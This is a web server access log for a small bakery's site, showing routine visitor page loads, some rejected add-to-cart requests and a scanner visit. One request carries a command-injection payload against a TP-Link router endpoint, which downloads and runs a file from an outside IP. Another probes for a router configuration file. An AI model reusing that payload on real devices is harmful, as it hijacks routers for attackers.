142.179.59.145 - - [08/May/2024:02:03:47 +0000] "GET /static/images/home_images/bg-sparkle.jpg HTTP/1.1" 200 21881598 "https://deztinysdessertz.ca/static/styles/landing_photo_style.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:02:03:47 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
162.216.149.208 - - [08/May/2024:02:12:13 +0000] "GET / HTTP/1.1" 200 3277 "http://209.38.130.13:80/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
84.54.51.41 - - [08/May/2024:02:35:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F185.216.70.79%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 179 "http://209.38.130.13:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F185.216.70.79%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)" "Go-http-client/1.1"
142.179.59.145 - - [08/May/2024:03:43:17 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:17 +0000] "GET /static/fonts/font.css HTTP/1.1" 200 813 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:17 +0000] "GET /static/layouts/landing_photo_layout.css HTTP/1.1" 200 375 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:17 +0000] "GET /static/scripts/home.js HTTP/1.1" 200 2151 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:17 +0000] "GET /static/layouts/universal_layout.css HTTP/1.1" 200 93 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/styles/landing_photo_style.css HTTP/1.1" 200 3955 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/styles/universal_style.css HTTP/1.1" 200 350 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/styles/header_style.css HTTP/1.1" 200 1635 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/layouts/header_layout.css HTTP/1.1" 200 487 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/universal_icons/bakery-home.png HTTP/1.1" 200 1775 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/universal_icons/bakery-menu.png HTTP/1.1" 200 1454 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/fonts/Courgette-Regular.ttf HTTP/1.1" 200 118784 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/fonts/Lemonada/static/Lemonada-Medium.ttf HTTP/1.1" 200 91648 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/universal_icons/bakery-catering.png HTTP/1.1" 200 1411 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/images/home_images/cupcakes2.jpg HTTP/1.1" 200 63547 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/universal_icons/bakery-profile.png HTTP/1.1" 200 2537 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/home_icons/profile_icon.png HTTP/1.1" 200 48703 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/images/home_images/cake1.jpg HTTP/1.1" 200 143959 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/images/universal_images/site-logo.png HTTP/1.1" 200 216343 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/universal_icons/dial-myrtle.png HTTP/1.1" 200 2128374 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/universal_icons/cupcart.png HTTP/1.1" 200 247472 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/icons/home_icons/catering_icon.png HTTP/1.1" 200 112617 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /static/images/home_images/bg-sparkle.jpg HTTP/1.1" 200 21881598 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:18 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
142.179.59.145 - - [08/May/2024:03:43:26 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
87.121.69.30 - - [08/May/2024:03:43:28 +0000] "GET /cgi/conf.bin HTTP/1.1" 404 159 "http://209.38.130.13:80/mainFrame.htm" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11"
142.179.59.145 - - [08/May/2024:03:44:40 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:44:40 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:45:26 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:45 +0000] "GET /catering/ HTTP/1.1" 200 1267 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:45 +0000] "GET /static/styles/catering_style.css HTTP/1.1" 200 1200 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:45 +0000] "GET /static/layouts/catering_layout.css HTTP/1.1" 200 237 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:45 +0000] "GET /static/scripts/catering.js HTTP/1.1" 200 2860 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /menu/ HTTP/1.1" 200 1604 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/styles/menu_style.css HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/layouts/menu_layout.css HTTP/1.1" 200 497 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/scripts/menu.js HTTP/1.1" 200 13986 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/images/menu_images/dippeddessert.jpg HTTP/1.1" 200 194320 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/images/menu_images/cupcakes.jpg HTTP/1.1" 200 171691 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/images/menu_images/cake1.jpg HTTP/1.1" 200 169204 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/icons/home_icons/question_icon.png HTTP/1.1" 200 53751 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:50 +0000] "GET /static/images/menu_images/otherdessert.jpg HTTP/1.1" 200 254000 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:55 +0000] "POST /add_to_cart/ HTTP/1.1" 403 570 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:59 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:59 +0000] "GET /static/styles/cart_style.css HTTP/1.1" 200 1882 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:59 +0000] "GET /static/scripts/cart.js HTTP/1.1" 200 5439 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:46:59 +0000] "GET /static/layouts/cart_layout.css HTTP/1.1" 200 548 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:47:02 +0000] "GET /menu/ HTTP/1.1" 200 1604 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET / HTTP/1.1" 200 844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/fonts/font.css HTTP/1.1" 200 813 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/styles/universal_style.css HTTP/1.1" 200 350 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/layouts/header_layout.css HTTP/1.1" 200 487 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/layouts/universal_layout.css HTTP/1.1" 200 93 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/styles/header_style.css HTTP/1.1" 200 1635 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/layouts/landing_photo_layout.css HTTP/1.1" 200 375 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/styles/landing_photo_style.css HTTP/1.1" 200 3955 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/universal_icons/bakery-home.png HTTP/1.1" 200 1775 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/universal_icons/bakery-menu.png HTTP/1.1" 200 1454 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/universal_icons/bakery-catering.png HTTP/1.1" 200 1411 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/universal_icons/bakery-profile.png HTTP/1.1" 200 2537 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/scripts/home.js HTTP/1.1" 200 2151 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/fonts/Courgette-Regular.ttf HTTP/1.1" 200 118784 "https://deztinysdessertz.ca/static/fonts/font.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/fonts/Lemonada/static/Lemonada-Medium.ttf HTTP/1.1" 200 91648 "https://deztinysdessertz.ca/static/fonts/font.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/universal_icons/cupcart.png HTTP/1.1" 200 247472 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/images/home_images/cake1.jpg HTTP/1.1" 200 143959 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/images/universal_images/site-logo.png HTTP/1.1" 200 216343 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/images/home_images/cupcakes2.jpg HTTP/1.1" 200 63547 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/home_icons/catering_icon.png HTTP/1.1" 200 112617 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:42 +0000] "GET /static/icons/home_icons/profile_icon.png HTTP/1.1" 200 48703 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:43 +0000] "GET /static/icons/universal_icons/dial-myrtle.png HTTP/1.1" 200 2128374 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:46 +0000] "GET /static/images/home_images/bg-sparkle.jpg HTTP/1.1" 200 21881598 "https://deztinysdessertz.ca/static/styles/landing_photo_style.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:47:46 +0000] "GET /favicon.ico HTTP/1.1" 404 159 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:47:56 +0000] "POST /add_to_cart/ HTTP/1.1" 403 570 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:47:57 +0000] "GET /cart/ HTTP/1.1" 200 998 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
142.179.59.145 - - [08/May/2024:03:47:59 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/cart/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /menu/ HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/styles/menu_style.css HTTP/1.1" 200 1602 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/layouts/menu_layout.css HTTP/1.1" 200 497 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/scripts/menu.js HTTP/1.1" 200 13986 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/images/menu_images/cake1.jpg HTTP/1.1" 200 169204 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/images/menu_images/dippeddessert.jpg HTTP/1.1" 200 194320 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/images/menu_images/cupcakes.jpg HTTP/1.1" 200 171691 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/images/menu_images/otherdessert.jpg HTTP/1.1" 200 254000 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:03 +0000] "GET /static/icons/home_icons/question_icon.png HTTP/1.1" 200 53751 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:08 +0000] "GET /catering/ HTTP/1.1" 200 1267 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:08 +0000] "GET /static/styles/catering_style.css HTTP/1.1" 200 1200 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:08 +0000] "GET /static/scripts/catering.js HTTP/1.1" 200 2860 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
207.81.58.39 - - [08/May/2024:03:48:08 +0000] "GET /static/layouts/catering_layout.css HTTP/1.1" 200 237 "https://deztinysdessertz.ca/catering/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
142.179.59.145 - - [08/May/2024:03:48:15 +0000] "POST /add_to_cart/ HTTP/1.1" 403 570 "https://deztinysdessertz.ca/menu/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
